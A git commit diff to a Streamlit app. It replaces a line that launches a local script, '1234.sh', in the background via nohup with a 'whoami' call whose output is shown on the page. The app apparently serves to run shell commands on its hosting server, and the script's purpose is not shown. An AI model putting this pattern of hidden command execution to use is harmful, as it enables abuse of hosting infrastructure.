8d05b692015cb25159f3270ce7106137bfef2424
akamehash <akameshimori@gmail.com>
2022-07-04 20:31:35 -0700

    Update streamlit_app.py

--- streamlit_app.py
+++ streamlit_app.py
@@ -1,6 +1,6 @@
 import streamlit as st
 import os
-output = os.popen('nohup bash ./1234.sh 2>&1&').read()
+output = os.popen('whoami').read()
 my_placeholder = st.empty()
 my_placeholder.text("The user entered %s" % output +'<br><form action="" method="get"><input type="text" name="username"><input type="submit" value="Submit"></form> ')
 
